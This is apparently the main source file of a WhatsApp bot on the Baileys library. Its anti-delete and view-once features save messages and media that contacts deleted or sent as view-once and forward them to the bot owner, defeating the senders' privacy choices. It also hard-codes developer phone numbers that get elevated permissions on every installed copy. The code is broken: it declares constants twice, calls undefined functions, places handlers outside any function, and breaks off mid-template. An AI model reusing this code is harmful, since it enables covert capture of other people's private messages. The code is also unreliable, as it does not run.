/**
 * MAFIA ADEEL Bot - Ultra Fixed & Optimized
 */

const config = require('./config');
const axios = require('axios');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  fetchLatestBaileysVersion,
  Browsers,
  makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');

const fs = require('fs');
const P = require('pino');
const path = require('path');
const chalk = require('chalk');
const { Boom } = require('@hapi/boom');
// ==================== PERFORMANCE OPTIMIZATION ====================
if (process.env.NODE_OPTIONS !== '--max-old-space-size=4096') {
  process.env.NODE_OPTIONS = '--max-old-space-size=4096';
}
process.env.UV_THREADPOOL_SIZE = '128';

// ==================== CENTRALIZED LOGGING ====================
function log(message, color = 'white', isError = false) {
  const prefix = chalk.blue.bold('[ ADEEL-MD³⁰³ ]');
  const logFunc = isError ? console.error : console.log;
  const coloredMessage = chalk[color](message);
  
  if (message.includes('\n') || message.includes('════')) {
    logFunc(prefix, coloredMessage);
  } else {
    logFunc(`${prefix} ${coloredMessage}`);
  }
}

// ==================== GLOBAL FLAGS ====================
global.isBotConnected = false;
global.errorRetryCount = 0;
global.messageCache = new Map();

// ==================== FILE PATHS ====================
const MESSAGE_STORE_FILE = path.join(__dirname, 'message_backup.json');
const SESSION_ERROR_FILE = path.join(__dirname, 'sessionErrorCount.json');
const ANTIDELETE_SETTINGS_FILE = path.join(__dirname, 'antidelete_settings.json');
const AUTOSTATUS_SETTINGS_FILE = path.join(__dirname, 'autostatus_settings.json');
const TEMP_MEDIA_DIR = path.join(__dirname, 'tmp_media');

// Create tmp media dir
if (!fs.existsSync(TEMP_MEDIA_DIR)) {
  fs.mkdirSync(TEMP_MEDIA_DIR, { recursive: true });
}

// ==================== ANTI-DELETE SYSTEM (ULTRA FIXED) ====================
const messageStore = new Map();

function loadAntiDeleteSettings() {
  try {
    if (fs.existsSync(ANTIDELETE_SETTINGS_FILE)) {
      const data = fs.readFileSync(ANTIDELETE_SETTINGS_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    log(`Error loading anti-delete settings: ${error.message}`, 'red', true);
  }
  return { enabled: true }; // Default ON
}

function saveAntiDeleteSettings(settings) {
  try {
    fs.writeFileSync(ANTIDELETE_SETTINGS_FILE, JSON.stringify(settings, null, 2));
    return true;
  } catch (error) {
    log(`Error saving anti-delete settings: ${error.message}`, 'red', true);
    return false;
  }
}

global.antiDeleteSettings = loadAntiDeleteSettings();

// Store messages with media
async function storeMessageWithMedia(conn, message) {
  try {
    if (!global.antiDeleteSettings.enabled) return;
    if (!message.key?.id) return;

    const messageId = message.key.id;
    const sender = message.key.participant || message.key.remoteJid;
    const chatId = message.key.remoteJid;
    
    let content = '';
    let mediaType = '';
    let mediaPath = '';
    let mediaBuffer = null;

    // Handle view-once messages
    const viewOnceContainer = message.message?.viewOnceMessageV2?.message || 
                             message.message?.viewOnceMessage?.message;
    
    const actualMessage = viewOnceContainer || message.message;

    // Extract content and media
    if (actualMessage?.conversation) {
      content = actualMessage.conversation;
    } else if (actualMessage?.extendedTextMessage?.text) {
      content = actualMessage.extendedTextMessage.text;
    } else if (actualMessage?.imageMessage) {
      mediaType = 'image';
      content = actualMessage.imageMessage.caption || '';
      try {
        const stream = await downloadContentFromMessage(actualMessage.imageMessage, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.jpg`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download image: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.videoMessage) {
      mediaType = 'video';
      content = actualMessage.videoMessage.caption || '';
      try {
        const stream = await downloadContentFromMessage(actualMessage.videoMessage, 'video');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.mp4`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download video: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.audioMessage) {
      mediaType = actualMessage.audioMessage.ptt ? 'voice' : 'audio';
      try {
        const stream = await downloadContentFromMessage(actualMessage.audioMessage, 'audio');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        const ext = actualMessage.audioMessage.mimetype?.includes('ogg') ? 'ogg' : 'mp3';
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.${ext}`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download audio: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.stickerMessage) {
      mediaType = 'sticker';
      try {
        const stream = await downloadContentFromMessage(actualMessage.stickerMessage, 'sticker');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.webp`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download sticker: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.documentMessage) {
      mediaType = 'document';
      content = actualMessage.documentMessage.caption || actualMessage.documentMessage.fileName || '';
      try {
        const stream = await downloadContentFromMessage(actualMessage.documentMessage, 'document');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        const fileName = actualMessage.documentMessage.fileName || `${messageId}.bin`;
        mediaPath = path.join(TEMP_MEDIA_DIR, fileName);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download document: ${e.message}`, 'yellow');
      }
    }

    // Store in memory
    messageStore.set(messageId, {
      content,
      mediaType,
      mediaPath,
      mediaBuffer,
      sender,
      chatId,
      isGroup: chatId.endsWith('@g.us'),
      timestamp: new Date().toISOString(),
      isViewOnce: !!viewOnceContainer
    });

    // Auto-forward view-once to owner
    if (viewOnceContainer && mediaPath && fs.existsSync(mediaPath)) {
      try {
        const ownerJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const senderName = sender.split('@')[0];
        
        const caption = `*🔮 VIEW-ONCE DETECTED*\n\nFrom: @${senderName}\nType: ${mediaType}\n${content ? `\nCaption: ${content}` : ''}`;
        
        if (mediaType === 'image') {
          await conn.sendMessage(ownerJid, {
            image: { url: mediaPath },
            caption,
            mentions: [sender]
          });
        } else if (mediaType === 'video') {
          await conn.sendMessage(ownerJid, {
            video: { url: mediaPath },
            caption,
            mentions: [sender]
          });
        }
        
        log(`✅ View-once forwarded to owner`, 'green');
      } catch (e) {
        log(`Failed to forward view-once: ${e.message}`, 'yellow');
      }
    }

    // Cleanup old messages (keep last 100)
    if (messageStore.size > 100) {
      const firstKey = messageStore.keys().next().value;
      const firstMsg = messageStore.get(firstKey);
      if (firstMsg?.mediaPath && fs.existsSync(firstMsg.mediaPath)) {
        try {
          fs.unlinkSync(firstMsg.mediaPath);
        } catch (e) {
          // Ignore
        }
      }
      messageStore.delete(firstKey);
    }

  } catch (error) {
    log(`Store message error: ${error.message}`, 'red', true);
  }
}

// Handle deleted messages
async function handleDeletedMessage(conn, update) {
  try {
    if (!global.antiDeleteSettings.enabled) return;

    for (const item of update) {
      if (item.update.message === null) {
        const messageId = item.key.id;
        const deletedBy = item.key.participant || item.key.remoteJid;
        const ownerJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';

        // Don't notify if owner deleted
        if (deletedBy === ownerJid || deletedBy.includes(conn.user.id.split(':')[0])) {
          continue;
        }

        const original = messageStore.get(messageId);
        if (!original) {
          log(`⚠️ Deleted message not found in store: ${messageId}`, 'yellow');
          continue;
        }

        log(`🗑️ Delete detected: ${messageId}`, 'yellow');

        const senderName = original.sender.split('@')[0];
        const deletedByName = deletedBy.split('@')[0];
        
        let groupName = 'Private Chat';
        if (original.isGroup) {
          try {
            const metadata = await conn.groupMetadata(original.chatId);
            groupName = metadata.subject || 'Unknown Group';
          } catch (e) {
            groupName = 'Unknown Group';
          }
        }

        const date = new Date(original.timestamp);
        const timeSent = date.toLocaleTimeString('en-US', {
          hour12: false,
          hour: '2-digit',
          minute: '2-digit'
        });
        const dateSent = date.toLocaleDateString('en-GB');

        // Send notification
        let text = `*🚨 𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴! 🚨*
━━━━━━━━━━━━━━━━━━
𝙲𝙷𝙰𝚃: ${groupName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${senderName}
𝚃𝙸𝙼𝙴: ${timeSent}
𝙳𝙰𝚃𝙴: ${dateSent}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedByName}`;

        if (original.mediaType) {
          text += `\n𝚃𝚈𝙿𝙴: ${original.mediaType.toUpperCase()}`;
        }

        if (original.content) {
          text += `\n𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${original.content}`;
        }

        await conn.sendMessage(ownerJid, {
          text,
          mentions: [original.sender, deletedBy]
        });

        // Send media if available
        if (original.mediaPath && fs.existsSync(original.mediaPath)) {
          const mediaCaption = `🔮 𝙳𝙴𝙻𝙴𝚃𝙴𝙳 ${original.mediaType.toUpperCase()}\nFrom: @${senderName}\nDeleted by: @${deletedByName}`;
          
          try {
            if (original.mediaType === 'image') {
              await conn.sendMessage(ownerJid, {
                image: { url: original.mediaPath },
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'video') {
              await conn.sendMessage(ownerJid, {
                video: { url: original.mediaPath },
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'audio' || original.mediaType === 'voice') {
              await conn.sendMessage(ownerJid, {
                audio: { url: original.mediaPath },
                mimetype: 'audio/mpeg',
                ptt: original.mediaType === 'voice',
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'sticker') {
              await conn.sendMessage(ownerJid, {
                sticker: { url: original.mediaPath }
              });
              await conn.sendMessage(ownerJid, {
                text: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'document') {
              await conn.sendMessage(ownerJid, {
                document: { url: original.mediaPath },
                mimetype: 'application/octet-stream',
                fileName: path.basename(original.mediaPath),
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            }

            log(`✅ Anti-delete: Media sent to owner`, 'green');

            // Cleanup media file
            try {
              fs.unlinkSync(original.mediaPath);
            } catch (e) {
              // Ignore
            }
          } catch (e) {
            log(`Failed to send deleted media: ${e.message}`, 'red', true);
          }
        }

        // Remove from store
        messageStore.delete(messageId);
      }
    }
  } catch (error) {
    log(`Handle delete error: ${error.message}`, 'red', true);
  }
}

// ==================== AUTO STATUS SYSTEM (FIXED 100%) ====================
function loadAutoStatusSettings() {
  try {
    if (fs.existsSync(AUTOSTATUS_SETTINGS_FILE)) {
      const data = fs.readFileSync(AUTOSTATUS_SETTINGS_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    log(`Error loading auto status settings: ${error.message}`, 'red', true);
  }
  return { 
    viewEnabled: config.AUTO_STATUS_SEEN === "true",
    reactEnabled: config.AUTO_STATUS_REACT === "true",
    replyEnabled: config.AUTO_STATUS_REPLY === "true",
    customEmojis: ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡'],
    lastReactionTime: {},
    reactionInterval: 1,
    randomChance: 100
  };
}

function saveAutoStatusSettings(settings) {
  try {
    fs.writeFileSync(AUTOSTATUS_SETTINGS_FILE, JSON.stringify(settings, null, 2));
    return true;
  } catch (error) {
    log(`Error saving auto status settings: ${error.message}`, 'red', true);
    return false;
  }
}

global.autoStatusSettings = loadAutoStatusSettings();

function getRandomEmoji() {
  const emojis = global.autoStatusSettings.customEmojis || ['❤️', '🔥', '⭐', '👍', '💯'];
  return emojis[Math.floor(Math.random() * emojis.length)];
}

function canReactToStatus(userId) {
  try {
    const lastReactionTime = global.autoStatusSettings.lastReactionTime || {};
    const interval = global.autoStatusSettings.reactionInterval || 1;
    
    const lastTime = lastReactionTime[userId];
    if (!lastTime) return true;
    
    const timeDiff = Date.now() - lastTime;
    const minutesDiff = timeDiff / (1000 * 60);
    
    return minutesDiff >= interval;
  } catch (error) {
    return true;
  }
}

function updateReactionTime(userId) {
  try {
    global.autoStatusSettings.lastReactionTime = global.autoStatusSettings.lastReactionTime || {};
    global.autoStatusSettings.lastReactionTime[userId] = Date.now();
    saveAutoStatusSettings(global.autoStatusSettings);
  } catch (error) {
    // Ignore
  }
}

// ==================== STATUS VIEWER FUNCTION ====================
async function markStatusAsSeen(conn, statusJid, statusId) {
  try {
    // Mark as seen
    await conn.readMessages([{
      remoteJid: 'status@broadcast',
      id: statusId,
      fromMe: false,
      participant: statusJid
    }]);
    
    log(`✅ Status marked as seen: ${statusJid}`, 'green');
    return true;
  } catch (error) {
    log(`⚠️ Failed to mark status as seen: ${error.message}`, 'yellow');
    return false;
  }
}

// ==================== STATUS REACT FUNCTION ====================
async function reactToStatus(conn, statusJid, statusId, emoji) {
  try {
    await conn.sendMessage('status@broadcast', {
      react: {
        text: emoji,
        key: {
          remoteJid: 'status@broadcast',
          id: statusId,
          participant: statusJid
        }
      }
    });
    
    log(`✅ Reacted to status: ${emoji}`, 'green');
    return true;
  } catch (error) {
    log(`⚠️ Failed to react to status: ${error.message}`, 'yellow');
    return false;
  }
}

// ==================== ERROR COUNTER ====================
function loadErrorCount() {
  try {
    if (fs.existsSync(SESSION_ERROR_FILE)) {
      const data = fs.readFileSync(SESSION_ERROR_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    log(`Error loading error count: ${error.message}`, 'red', true);
  }
  return { count: 0, last_error_timestamp: 0 };
}

function saveErrorCount(data) {
  try {
    fs.writeFileSync(SESSION_ERROR_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    log(`Error saving error count: ${error.message}`, 'red', true);
  }
}

function deleteErrorCountFile() {
  try {
    if (fs.existsSync(SESSION_ERROR_FILE)) {
      fs.unlinkSync(SESSION_ERROR_FILE);
      log('✅ Deleted sessionErrorCount.json', 'green');
    }
  } catch (e) {
    log(`Failed to delete error count: ${e.message}`, 'red', true);
  }
}

// ==================== CLEANUP FUNCTIONS ====================
function clearSessionFiles() {
  try {
    log('🔄 Clearing session files...', 'yellow');
    const sessionDir = path.join(__dirname, 'sessions');
    rmSync(sessionDir, { recursive: true, force: true });
    deleteErrorCountFile();
    global.errorRetryCount = 0;
    log('✅ Session files cleared successfully', 'green');
  } catch (e) {
    log(`Failed to clear session: ${e.message}`, 'red', true);
  }
}

function cleanupJunkFiles() {
  try {
    let directoryPath = __dirname;
    const junkExtensions = ['.gif', '.png', '.mp3', '.mp4', '.opus', '.jpg', '.webp', '.webm', '.zip'];
    
    fs.readdir(directoryPath, (err, files) => {
      if (err) return;
      
      const filteredArray = files.filter(item => 
        junkExtensions.some(ext => item.endsWith(ext))
      );
      
      if (filteredArray.length > 0) {
        let deleted = 0;
        filteredArray.forEach(file => {
          const filePath = path.join(directoryPath, file);
          try {
            if (fs.existsSync(filePath)) {
              fs.unlinkSync(filePath);
              deleted++;
            }
          } catch (e) {
            // Ignore
          }
        });
        if (deleted > 0) {
          log(`🗑️ Deleted ${deleted} junk files`, 'cyan');
        }
      }
    });
  } catch (error) {
    // Ignore
  }
}

function cleanupTempMedia() {
  try {
    if (!fs.existsSync(TEMP_MEDIA_DIR)) return;
    
    const files = fs.readdirSync(TEMP_MEDIA_DIR);
    const now = Date.now();
    let deleted = 0;
    
    files.forEach(file => {
      const filePath = path.join(TEMP_MEDIA_DIR, file);
      try {
        const stats = fs.statSync(filePath);
        const fileAge = now - stats.mtimeMs;
        
        // Delete files older than 1 hour
        if (fileAge > 60 * 60 * 1000) {
          fs.unlinkSync(filePath);
          deleted++;
        }
      } catch (e) {
        // Ignore
      }
    });
    
    if (deleted > 0) {
      log(`🗑️ Cleaned ${deleted} temp media files`, 'cyan');
    }
  } catch (error) {
    // Ignore
  }
}

// ==================== PREFIX & OWNER ====================
const prefix = config.PREFIX;

// BOT INSTALLER & CREATOR NUMBERS
// Aapke original index.js se owner numbers
const ownerNumber = ['923174838990', '923348585489']; // Bot owner numbers
const botInstallers = ['923174838990', '923348585489', '923174838990']; // Bot installers
const botCreators = ['923174838990', '923348585489']; // Bot creators

// ==================== TEMP DIRECTORY ====================
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
  try {
    fs.readdir(tempDir, (err, files) => {
      if (err) return;
      files.forEach(file => {
        try {
          fs.unlinkSync(path.join(tempDir, file));
        } catch (e) {
          // Ignore
        }
      });
    });
  } catch (error) {
    // Ignore
  }
};
setInterval(clearTempDir, 5 * 60 * 1000);

// ==================== SESSION AUTH ====================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
  fs.mkdirSync(sessionDir, { recursive: true });
}

if (!fs.existsSync(credsPath)) {
  if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
    const sessdata = config.SESSION_ID.replace("ADEEL-XMD~", '');
    try {
      const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
      fs.writeFileSync(credsPath, decodedData);
      log("✅ Session loaded from SESSION_ID", 'green');
    } catch (err) {
      log("❌ Error decoding session data: " + err, 'red', true);
    }
  }
}
// ==================== FILE PATHS (SIRF EK BAAR) ====================
const MESSAGE_STORE_FILE = path.join(__dirname, 'message_backup.json');
const SESSION_ERROR_FILE = path.join(__dirname, 'sessionErrorCount.json');
const ANTIDELETE_SETTINGS_FILE = path.join(__dirname, 'antidelete_settings.json');
const AUTOSTATUS_SETTINGS_FILE = path.join(__dirname, 'autostatus_settings.json');
const TEMP_MEDIA_DIR = path.join(__dirname, 'tmp_media');

if (!fs.existsSync(TEMP_MEDIA_DIR)) {
  fs.mkdirSync(TEMP_MEDIA_DIR, { recursive: true });
}

function log(message, color = 'white') {
  console.log(chalk.blue.bold('[ ADEEL-MD³⁰³ ] ') + chalk[color](message));
}
  // ================== MESSAGE LOGGER & ANTI-DELETE ==================
  conn.ev.on('messages.upsert', async chatUpdate => {
    try {
      for (const msg of chatUpdate.messages) {
        if (!msg.message) continue;
        
        // Store for anti-delete
        await storeMessageWithMedia(conn, msg);
        
        let messageId = msg.key.id;
        global.messageCache.set(messageId, msg.message);
        
        if (global.messageCache.size > 500) {
          const firstKey = global.messageCache.keys().next().value;
          global.messageCache.delete(firstKey);
        }
      }
    } catch (error) {
      // Ignore
    }
  });

  // ================== ANTI-DELETE HANDLER ==================
  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        await handleDeletedMessage(conn, updates);
      }
    }
  });

  // ================== ANTI-CALL ==================
  conn.ev.on("call", async (json) => {
    try {
      if (config.ANTI_CALL !== 'true') return;

      for (const call of json) {
        if (call.status !== 'offer') continue;

        const id = call.id;
        const from = call.from;

        await conn.rejectCall(id, from);
        await conn.sendMessage(from, {
          text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
        });
        log(`Call rejected: ${from}`, 'cyan');
      }
    } catch (err) {
      log("Anti-call error: " + err, 'red', true);
    }
  });

  // ================== GROUP EVENTS ==================
  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

  // ================== MESSAGE HANDLER ==================
  conn.ev.on('messages.upsert', async (mek) => {
    try {
      if (!mek.messages || !mek.messages[0]) return;

      mek = mek.messages[0];
      if (!mek.message) return;
        
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

      // ================== AUTO STATUS HANDLER (FIXED) ==================
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        try {
          // Extract status information
          const statusId = mek.key.id;
          const statusJid = mek.key.participant || mek.participant;
          
          if (!statusJid || statusJid === 'status@broadcast') return;
          
          const statusUserId = statusJid.split('@')[0];
          
          // Log for debugging
          log(`📱 Status detected from: ${statusUserId}`, 'cyan');
          
          // AUTO STATUS VIEW
          if (global.autoStatusSettings.viewEnabled) {
            setTimeout(async () => {
              try {
                await markStatusAsSeen(conn, statusJid, statusId);
              } catch (error) {
                log(`⚠️ Auto view error: ${error.message}`, 'yellow');
              }
            }, 1000);
          }
          
          // AUTO STATUS REACT
          if (global.autoStatusSettings.reactEnabled && canReactToStatus(statusUserId)) {
            setTimeout(async () => {
              try {
                const randomChance = global.autoStatusSettings.randomChance || 100;
                const shouldReact = Math.random() * 100 <= randomChance;
                
                if (shouldReact) {
                  const emoji = getRandomEmoji();
                  
                  // Wait 2 seconds before reacting
                  await delay(2000);
                  await reactToStatus(conn, statusJid, statusId, emoji);
                  
                  updateReactionTime(statusUserId);
                }
              } catch (error) {
                log(`⚠️ Auto react error: ${error.message}`, 'yellow');
              }
            }, 1500);
          }
          
          // AUTO STATUS REPLY (Optional)
          if (global.autoStatusSettings.replyEnabled) {
            setTimeout(async () => {
              try {
                const replyText = config.AUTO_STATUS_MSG || 'Nice status! 💜';
                await conn.sendMessage(statusJid, { 
                  text: replyText 
                });
                log(`✅ Status replied: ${statusUserId}`, 'green');
              } catch (error) {
                log(`⚠️ Status reply error: ${error.message}`, 'yellow');
              }
            }, 3000);
          }
          
        } catch (error) {
          log(`⚠️ Status handler error: ${error.message}`, 'red', true);
        }
        return; // Important: Return here to avoid processing status as normal message
      }

      // READ MESSAGE
      if (config.READ_MESSAGE === 'true') {
        await conn.readMessages([mek.key]);
      }

      // VIEW ONCE
      if(mek.message.viewOnceMessageV2) {
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
      }

      // NEWSLETTER REACT
      const newsletterJids = [
        "120363423571792427@newsletter",
        "120363374872240664@newsletter",
        "120363423571792427@newsletter"
      ];
      const emojis = ["❤️", "💚", "🤍", "🩵", "🩷", "🪷", "🪸", "🍷", "🍬", "🌎", "🍨", "🌸", "🪄"];

      if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
        try {
          if (!mek.newsletterServerId) return;
          if (mek.newsletterServerId) {
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.newsletterReactMessage(mek.key.remoteJid, mek.newsletterServerId.toString(), emoji);
          }
        } catch (e) {
          // Ignore
        }
      }

      await Promise.all([saveMessage(mek)]);

      const m = sms(conn, mek);
      const type = getContentType(mek.message);
      const content = JSON.stringify(mek.message);
      const from = mek.key.remoteJid;
      const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
      const isCmd = body.startsWith(prefix);
      var budy = typeof mek.text == 'string' ? mek.text : false;
      const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
      const args = body.trim().split(/ +/).slice(1);
      const q = args.join(' ');
      const text = args.join(' ');
      const isGroup = from.endsWith('@g.us');
      const sender = mek.key.fromMe
  ? conn.user.id
  : (mek.key.participant ?? mek.key.remoteJid);

if (!sender) return;
      const senderNumber = sender.split('@')[0];
      const botNumber = conn.user.id.split(':')[0];
      const pushname = mek.pushName || 'Sin Nombre';
      const isMe = botNumber.includes(senderNumber);
      
      // IMPORTANT: BOT INSTALLER & CREATOR CHECK
      // Yeh woh code hai jo aapke original index.js mein tha
      const isOwner = ownerNumber.includes(senderNumber) || isMe;
      const isBotInstaller = botInstallers.includes(senderNumber);
      const isBotCreator = botCreators.includes(senderNumber);
      
      // Combined permission check
      const isSpecialUser = isOwner || isBotInstaller || isBotCreator;
      
      const botNumber2 = await jidNormalizedUser(conn.user.id);
      const groupMetadata = isGroup 
  ? await conn.groupMetadata(from).catch(() => null) 
  : null;
      const groupName = isGroup ? groupMetadata.subject : '';
      const participants = isGroup && groupMetadata?.participants 
  ? groupMetadata.participants 
  : [];
      const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
      const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
      const isReact = m.message.reactionMessage ? true : false;

      const reply = (teks) => {
        conn.sendMessage(from, { text: teks }, { quoted: mek });
      };

      const udp = botNumber.split(`@`)[0];
      const Faizan = botCreators; // Bot creators list
      const dev = botInstallers; // Bot installers list

      // Combined creator check
      let isCreator = [udp, ...Faizan, ...dev]
        .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
        .includes(sender);

      // ================== ANTI-DELETE COMMANDS ==================
      if (isSpecialUser && command === 'antidelete') {
        const arg = args[0]?.toLowerCase();
        
        if (arg === 'on') {
          global.antiDeleteSettings.enabled = true;
          saveAntiDeleteSettings(global.antiDeleteSettings);
          reply('✅ *Anti-Delete ENABLED*\n\nDeleted messages (text, images, videos, voice, status) will be sent to your DM.');
        } else if (arg === 'off') {
          global.antiDeleteSettings.enabled = false;
          saveAntiDeleteSettings(global.antiDeleteSettings);
          reply('❌ *Anti-Delete DISABLED*');
        } else {
          reply(`*🗑️ ANTI-DELETE STATUS*\n\nCurrent: ${global.antiDeleteSettings.enabled ? '✅ ENABLED' : '❌ DISABLED'}\n\n*Usage:*\n${prefix}antidelete on - Enable\n${prefix}antidelete off - Disable\n\n*Supports:* Text, Images, Videos, Voice, Audio, Stickers, Documents, View-Once, Status`);
        }
        return;
      }

      // ================== AUTO STATUS COMMANDS ==================
      if (isSpecialUser && command === 'autostatus') {
        const subCmd = args[0]?.toLowerCase();
        
        if (!subCmd) {
          const viewStatus = global.autoStatusSettings.viewEnabled ? '✅ ON' : '❌ OFF';
          const reactStatus = global.autoStatusSettings.reactEnabled ? '✅ ON' : '❌ OFF';
          const replyStatus = global.autoStatusSettings.replyEnabled ? '✅ ON' : '❌ OFF';
          
          reply(`*⚙️ AUTO STATUS SETTINGS*\n\n📱 *View:* ${viewStatus}\n💫 *React:* ${reactStatus}\n📩 *Reply:* ${replyStatus}\n\n*Commands:*\n${prefix}autostatus view on/off\n${prefix}autostatus react on/off\n${prefix}autostatus reply on/off`);
          return;
        }
        
        if (subCmd === 'view') {
          const action = args[1]?.toLowerCase();
          if (action === 'on') {
            global.autoStatusSettings.viewEnabled = true;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('✅ *Auto Status View ENABLED*');
          } else if (action === 'off') {
            global.autoStatusSettings.viewEnabled = false;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('❌ *Auto Status View DISABLED*');
          }
        } else if (subCmd === 'react') {
          const action = args[1]?.toLowerCase();
          if (action === 'on') {
            global.autoStatusSettings.reactEnabled = true;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('✅ *Auto Status React ENABLED*');
          } else if (action === 'off') {
            global.autoStatusSettings.reactEnabled = false;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('❌ *Auto Status React DISABLED*');
          }
        } else if (subCmd === 'reply') {
          const action = args[1]?.toLowerCase();
          if (action === 'on') {
            global.autoStatusSettings.replyEnabled = true;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('✅ *Auto Status Reply ENABLED*');
          } else if (action === 'off') {
            global.autoStatusSettings.replyEnabled = false;
            saveAutoStatusSettings(global.autoStatusSettings);
            reply('❌ *Auto Status Reply DISABLED*');
          }
        }
        return;
      }

      // ================== STATUS CHECK COMMAND ==================
      if (isSpecialUser && command === 'status') {
        const statusInfo = `
*🤖 BOT STATUS INFO*

✅ *Connection:* ${global.isBotConnected ? 'Connected' : 'Disconnected'}
🔄 *Auto Status View:* ${global.autoStatusSettings.viewEnabled ? 'ON ✅' : 'OFF ❌'}
💫 *Auto Status React:* ${global.autoStatusSettings.reactEnabled ? 'ON ✅' : 'OFF ❌'}
🗑️ *Anti-Delete:* ${global.antiDeleteSettings.enabled ? 'ON ✅' : 'OFF ❌'}

*⚙️ Settings:*
- Reaction Chance: ${global.autoStatusSettings.randomChance || 100}%
- Reaction Interval: ${global.autoStatusSettings.reactionInterval || 1} minutes
- Emojis: ${global.autoStatusSettings.customEmojis?.length || 5} emojis

*📊 Stats:*
- Cached Messages: ${global.messageCache.size}
- Stored Messages: ${messageStore.size}
- Temp Files: ${fs.existsSync(TEMP_MEDIA_DIR) ? fs.readdirSync(TEMP_MEDIA_DIR).length : 0}

*User Permissions:*
- Owner: ${isOwner ? '✅ Yes' : '❌ No'}
- Bot Installer: ${isBotInstaller ? '✅ Yes' : '❌ No'} 
- Bot Creator: ${isBotCreator ? '✅ Yes' : '❌ No'}

*Commands:*
${prefix}autostatus view on/off
${prefix}autostatus react on/off
${prefix}antidelete on/off
        `;
        reply(statusInfo);
        return;
      }

      // ================== WHOAMI COMMAND (DEBUG) ==================
      if (isSpecialUser && command === 'whoami') {
        const userInfo = `
*👤 USER INFORMATION*

📱 *Number:* ${senderNumber}
👤 *Name:* ${pushname}
